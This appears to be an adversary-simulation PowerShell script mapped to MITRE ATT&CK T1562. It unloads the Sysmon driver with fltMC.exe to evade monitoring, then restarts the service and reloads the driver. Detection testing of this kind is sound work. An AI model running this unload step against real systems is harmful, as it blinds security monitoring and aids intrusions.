<#
    T1562.006 - Impair Defenses: Indicator Blocking
    T1562.002 - Impair Defenses: Disable Windows Event Logging
    T1562.001 - Impair Defenses: Disable or Modify Tools
    Unload Sysmon driver, allow the attacker to bypass sysmon detections (most of it, network monitoring will still be effective)
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append

$sysmon_driver_altitude = fltmc.exe | Select-String "385201"
if($sysmon_driver_altitude){
    Write-Host -ForegroundColor Cyan "Sysmon driver found at Altitude 385201"
}
Write-Host -ForegroundColor Cyan "Unloading Sysmon driver"
fltMC.exe unload SysmonDrv
$sysmon_driver_altitude = fltmc.exe | Select-String "385201"
if(-not $sysmon_driver_altitude){
    Write-Host -ForegroundColor Green "Success: Sysmon driver unloaded"
}

# End simulation, To reload properly stop serive and load again
$services = @('Sysmon64','Sysmon')
foreach($svc in $services){
    try{
        $Service = Get-WmiObject -Class win32_service -Filter "Name = `'$svc`'"
        if($Service){
            # Stop Services
            if ((Get-Service $Service.Name).Status -eq "Running"){
                Stop-Process -Id $Service.ProcessId -Force -PassThru -ErrorAction Stop
            }
            if ((Get-Service $Service.Name).Status -ne "Running"){
                Write-Host -ForegroundColor Cyan $Service.Name "stopped"
                Set-Service -Name $service.Name -StartupType Automatic
                Write-Host -ForegroundColor Cyan "Loading Sysmon Driver with fltMC.exe..."
                sleep 1
                fltMC.exe load SysmonDrv
                Start-Service -Name $service.Name
                if ((Get-Service $Service.Name).Status -eq "Running"){
                    Write-Host -ForegroundColor Green "Sucess: "$Service.Name"restarted" 
                }
                else{
                    Write-Host -ForegroundColor Red "Error: "$Service.Name"could not be restarted..." 
                }
            }
            else{
                Write-Host -ForegroundColor Red "Error: Cannot stop"$Service.Name" still running..." 
            }
   
        }
        else{
            Write-Host -ForegroundColor Gray "Service $svc not found" 
        }

    }
    catch{
        Write-Host -ForegroundColor Red "Error: $_" 
    }
}
$sysmon_driver = fltmc.exe | Select-String "385201","Sysmon"
if(-not $sysmon_driver){
    Write-Host -ForegroundColor Red "Error: Sysmon driver does not seems to have reload properly"
}

Stop-Transcript
